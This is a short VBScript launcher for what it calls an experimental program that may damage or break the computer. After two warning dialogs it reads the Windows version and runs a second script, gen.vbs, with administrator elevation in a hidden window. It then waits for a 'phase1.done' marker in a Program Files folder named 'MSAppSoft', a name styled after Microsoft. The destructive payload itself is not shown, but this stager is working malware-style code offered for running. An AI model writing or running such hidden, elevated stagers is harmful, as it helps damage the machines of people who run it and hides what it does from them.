Option Explicit
Dim sh, r, ver, cwd, dir, i

Set sh = CreateObject("WScript.Shell")

r = MsgBox("This program is an experimental program. It may damage your computer. Always run it on a PC you do not mind breaking, or inside a virtual machine.", vbYesNo + vbExclamation, "Warning")
If r <> vbYes Then WScript.Quit

r = MsgBox("FINAL WARNING! A beginner cannot fix this, and it may leave your PC unusable. Run it only if you accept that.", vbYesNo + vbCritical, "Final Warning!")
If r <> vbYes Then WScript.Quit

ver = 5
On Error Resume Next
ver = CInt(Left(sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentVersion"), 1))
On Error GoTo 0

cwd = sh.CurrentDirectory
dir = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"

If ver >= 6 Then
    sh.ShellExecute "wscript.exe", """" & cwd & "\gen.vbs""", cwd, "runas", 0
Else
    sh.Run "wscript.exe """ & cwd & "\gen.vbs""", 0, False
End If

For i = 1 To 300
    If CreateObject("Scripting.FileSystemObject").FileExists(dir & "\phase1.done") Then Exit For
    WScript.Sleep 500
Next
